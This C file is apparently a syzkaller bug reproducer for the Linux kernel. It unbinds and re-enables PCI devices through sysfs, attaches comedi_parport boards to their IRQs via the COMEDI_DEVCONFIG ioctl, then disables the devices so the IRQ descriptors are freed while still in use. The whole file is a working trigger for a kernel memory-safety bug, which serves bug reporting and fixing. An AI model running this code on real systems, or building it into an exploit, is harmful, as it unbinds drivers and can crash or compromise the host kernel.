// https://syzkaller.appspot.com/bug?id=a8590c6407d8f31f635d77103db9fceb22984703
#define _GNU_SOURCE
#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>

#define COMEDI_NAMELEN 20
#define COMEDI_NDEVCONFOPTS 32
#define CIO 'd'
#define COMEDI_DEVCONFIG _IOW(CIO, 0, struct comedi_devconfig)

struct comedi_devconfig {
	char board_name[COMEDI_NAMELEN];
	int options[COMEDI_NDEVCONFOPTS];
};

struct pci_dev {
	char name[256];
	int irq;
	int enable_fd;
};

#define MAX_DEVS 64
struct pci_dev devs[MAX_DEVS];
int num_devs = 0;

int main(void)
{
	DIR *dir;
	struct dirent *ent;
	char path[256];
	char buf[256];
	int fd;

	dir = opendir("/sys/bus/pci/devices");
	if (!dir) {
		printf("[-] Failed to open /sys/bus/pci/devices: %s\n", strerror(errno));
		exit(1);
	}
	printf("[+] Opened /sys/bus/pci/devices\n");

	while ((ent = readdir(dir)) != NULL && num_devs < MAX_DEVS) {
		if (ent->d_name[0] == '.')
			continue;

		/* Skip bridges, storage, network, and display devices to avoid killing the VM */
		snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/class", ent->d_name);
		fd = open(path, O_RDONLY);
		if (fd >= 0) {
			int n = read(fd, buf, sizeof(buf) - 1);
			close(fd);
			if (n > 0) {
				buf[n] = '\0';
				long class_val = strtol(buf, NULL, 16);
				int base_class = class_val >> 16;
				if (base_class == 0x01 || base_class == 0x02 || base_class == 0x03 || base_class == 0x06)
					continue;
			}
		}

		printf("[*] Trying PCI device %s\n", ent->d_name);

		/* Unbind the device from its driver */
		snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/driver/unbind", ent->d_name);
		fd = open(path, O_WRONLY);
		if (fd >= 0) {
			if (write(fd, ent->d_name, strlen(ent->d_name)) < 0) {
				printf("[-] Failed to unbind %s: %s\n", ent->d_name, strerror(errno));
			} else {
				printf("[+] Unbound %s\n", ent->d_name);
			}
			close(fd);
		}

		/* Enable the device to allocate the legacy IRQ */
		snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/enable", ent->d_name);
		int enable_fd = open(path, O_RDWR);
		if (enable_fd >= 0) {
			if (write(enable_fd, "1\n", 2) != 2) {
				printf("[-] Failed to enable %s: %s\n", ent->d_name, strerror(errno));
				close(enable_fd);
				continue;
			}
			printf("[+] Enabled %s\n", ent->d_name);
		} else {
			printf("[-] Failed to open enable for %s: %s\n", ent->d_name, strerror(errno));
			continue;
		}

		/* Read the allocated IRQ */
		int irq = -1;
		snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/irq", ent->d_name);
		fd = open(path, O_RDONLY);
		if (fd >= 0) {
			int n = read(fd, buf, sizeof(buf) - 1);
			close(fd);
			if (n > 0) {
				buf[n] = '\0';
				irq = atoi(buf);
			}
		}

		if (irq > 0) {
			printf("[+] Got IRQ %d for device %s\n", irq, ent->d_name);
			strncpy(devs[num_devs].name, ent->d_name, sizeof(devs[num_devs].name) - 1);
			devs[num_devs].irq = irq;
			devs[num_devs].enable_fd = enable_fd;
			num_devs++;
		} else {
			printf("[-] Invalid IRQ %d for device %s\n", irq, ent->d_name);
			if (write(enable_fd, "0\n", 2) < 0) {
				printf("[-] Failed to disable device: %s\n", strerror(errno));
			}
			close(enable_fd);
		}
	}
	closedir(dir);

	int comedi_idx = 0;
	int used_irqs[1024] = {0};
	int comedi_fds[64];

	for (int i = 0; i < num_devs; i++) {
		int irq = devs[i].irq;
		if (irq >= 1024 || used_irqs[irq])
			continue;

		snprintf(path, sizeof(path), "/dev/comedi%d", comedi_idx);
		int comedi_fd = open(path, O_RDWR);
		if (comedi_fd < 0) {
			printf("[-] Failed to open %s: %s\n", path, strerror(errno));
			continue;
		}

		struct comedi_devconfig config;
		memset(&config, 0, sizeof(config));
		strncpy(config.board_name, "comedi_parport", COMEDI_NAMELEN - 1);
		config.options[1] = irq;

		int attached = 0;
		/* Try a few standard I/O ports until one succeeds */
		for (int port = 0x200; port < 0x300; port += 8) {
			config.options[0] = port;
			if (ioctl(comedi_fd, COMEDI_DEVCONFIG, &config) == 0) {
				attached = 1;
				printf("[+] Attached comedi_parport at port 0x%x with IRQ %d on %s\n", port, irq, path);
				break;
			}
		}

		if (attached) {
			used_irqs[irq] = 1;
			comedi_fds[comedi_idx] = comedi_fd;
			comedi_idx++;
			if (comedi_idx >= 64)
				break;
		} else {
			printf("[-] Failed to attach comedi_parport on %s\n", path);
			close(comedi_fd);
		}
	}

	/* Disable all devices to free the IRQ descriptors and trigger the bug */
	printf("[*] Disabling PCI devices to free IRQ descriptors...\n");
	for (int i = 0; i < num_devs; i++) {
		if (write(devs[i].enable_fd, "0\n", 2) < 0) {
			printf("[-] Failed to disable device %s: %s\n", devs[i].name, strerror(errno));
		} else {
			printf("[+] Disabled device %s\n", devs[i].name);
		}
		close(devs[i].enable_fd);
	}

	/* Keep the process alive for a bit to ensure async work completes if any */
	sleep(2);

	printf("[+] Done\n");
	return 0;
}